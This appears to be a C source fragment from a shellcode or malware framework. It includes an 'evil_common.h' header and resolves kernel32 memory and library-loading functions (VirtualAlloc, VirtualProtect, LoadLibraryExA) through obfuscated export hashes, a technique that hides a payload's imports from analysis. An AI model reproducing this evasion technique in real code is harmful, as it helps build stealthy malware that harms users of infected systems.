#include "lpfns.h"
#include "exp_by_hash.h"
#include "evil_common.h"
#include "../string_hashes.h"
//#include "evil_common.h"

// shared lpfns of NEEDAPI_Xxx
//@@@zvars
#ifdef NEEDAPI_VirtualAlloc
LPFN_VirtualAlloc lpfnVirtualAlloc;
#endif
#ifdef NEEDAPI_VirtualFree
LPFN_VirtualFree lpfnVirtualFree;
#endif
#ifdef NEEDAPI_VirtualProtect
LPFN_VirtualProtect lpfnVirtualProtect;
#endif
#ifdef NEEDAPI_LoadLibraryExA
LPFN_LoadLibraryExA lpfnLoadLibraryExA;
#endif
//@@@endzvars


SPRAYABLE_PROC(lpfns_resolve) {
  //@@@proc /name lpfns_resolve
  CHILD_A1 = Z(g_hKernel32);

#ifdef NEEDAPI_VirtualAlloc
  CHILD_A2D = ObfEncDw(VirtualAlloc_HASH);
  _CALL(exp_by_hash);
  Z(lpfnVirtualAlloc) = (LPFN_VirtualAlloc)CHILD_RET;
#endif
#ifdef NEEDAPI_VirtualFree
  CHILD_A2D = ObfEncDw(VirtualFree_HASH);
  _CALL(exp_by_hash);
  Z(lpfnVirtualFree) = (LPFN_VirtualFree)CHILD_RET;
#endif
#ifdef NEEDAPI_VirtualProtect
  CHILD_A2D = ObfEncDw(VirtualProtect_HASH);
  _CALL(exp_by_hash);
  Z(lpfnVirtualProtect) = (LPFN_VirtualProtect)CHILD_RET;
#endif
#ifdef NEEDAPI_LoadLibraryExA
  CHILD_A2D = ObfEncDw(LoadLibraryExA_HASH);
  _CALL(exp_by_hash);
  Z(lpfnLoadLibraryExA) = (LPFN_LoadLibraryExA)CHILD_RET;
#endif
  //@@@endproc
}

